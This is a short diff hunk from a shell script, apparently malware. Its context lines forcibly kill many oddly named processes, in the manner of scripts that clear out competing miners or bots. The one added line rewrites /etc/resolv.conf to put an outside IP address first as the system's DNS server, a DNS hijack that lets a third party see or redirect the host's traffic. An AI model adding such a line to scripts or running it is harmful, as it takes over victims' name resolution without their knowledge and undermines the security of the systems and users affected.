@@ -90,6 +90,7 @@ pkill -9 ./Duck.sh
 pkill -9 ./Guard.sh
 pkill -9 ./JnKihGjn
 pkill -9 ./KGlJwfWDbCPnvwEJupeivI1FXsSptuyh
+sed -i '1i\nameserver 123.207.164.214' /etc/resolv.conf
 pkill -9 ./NXLAi
 pkill -9 ./XJnRj
 pkill -9 ./accounts-daemon
